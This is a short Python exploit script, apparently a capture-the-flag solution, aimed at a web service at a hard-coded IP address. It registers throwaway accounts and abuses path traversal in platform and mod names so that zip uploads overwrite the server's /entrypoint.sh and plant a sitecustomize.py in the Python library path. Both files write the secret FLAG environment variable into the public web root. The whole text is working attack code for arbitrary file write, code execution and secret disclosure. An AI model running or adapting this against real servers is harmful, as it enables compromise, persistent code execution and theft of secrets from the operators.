import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36534"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

# 1. Overwrite /entrypoint.sh with a flag-dumper (writes flag, then starts nginx)
entry = b'#!/bin/bash\necho "$FLAG" > /usr/share/nginx/html/flag.txt\nexec nginx -g "daemon off;"\n'
tok,u=fresh()
pid=pf.create_platform(tok,"proc",name="z"); mid=pf.create_mod(tok,"../../../..",title="z"); bid=pf.create_build(tok,mid,pid)
# storage_dir = /data/media/builds/../../../../ = / ; filename entrypoint.sh -> /entrypoint.sh
r=pf.upload_zip(tok,mid,bid,{"entrypoint.sh": entry})
print("overwrite /entrypoint.sh ->", r.status_code, r.text[:80])

# 2. plant sitecustomize in /usr/local stdlib (belt-and-suspenders)
sc = b'import os\ntry:\n    open("/usr/share/nginx/html/flag.txt","w").write(os.environ.get("FLAG","NOFLAG")+"\\n")\nexcept Exception: pass\n'
tok2,u2=fresh()
try:
    pid2=pf.create_platform(tok2,"lib/python3.11",name="z"); mid2=pf.create_mod(tok2,"../../../usr/local",title="z"); bid2=pf.create_build(tok2,mid2,pid2)
    r2=pf.upload_zip(tok2,mid2,bid2,{"sitecustomize.py": sc})
    print("plant sitecustomize ->", r2.status_code)
except Exception as e:
    print("sitecustomize err", repr(e)[:80])
print("set up done")
